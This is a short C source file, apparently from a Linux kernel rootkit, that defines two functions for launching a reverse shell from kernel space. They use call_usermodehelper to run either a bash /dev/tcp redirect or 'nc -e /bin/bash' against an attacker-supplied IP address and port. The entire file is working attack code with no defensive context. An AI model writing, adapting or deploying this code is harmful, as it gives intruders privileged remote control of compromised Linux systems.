#include "rshell.h"
#include <linux/kmod.h>

void try_reverse_shell_bash(__u32 ip, __u32 port)
{
    char shell_path[128] = {0};
    int err = 0;

    err = snprintf(shell_path, sizeof(shell_path), 
                 "/bin/bash -i >& /dev/tcp/%pI4/%hu 0>&1", &ip, port);

    if (0 <= err && err <= sizeof(shell_path)) {
        char *envp[] = {"PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin",
                        "HOME=/",
                        "TERM=screen",
                        "PS1=\\u@\\h \\W]\\$",
                        NULL};
        char *argv[4] = {"/bin/bash", "-c", NULL, NULL};

        argv[2] = shell_path;
        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    }
}

void try_reverse_shell_nc(__u32 ip, __u32 port)
{
    char *envp[] = { "PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin",
                     "HOME=/",
                     "TERM=linux",
                     NULL };
    char *argv[6] = {"/bin/nc", "-e", "/bin/bash", NULL, NULL, NULL};
    char ipstr[128] = {0};
    char portstr[32] = {0};

    sprintf(ipstr, "%pI4", &ip);
    argv[3] = ipstr;
    sprintf(portstr, "%hu", port);
    argv[4] = portstr;

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

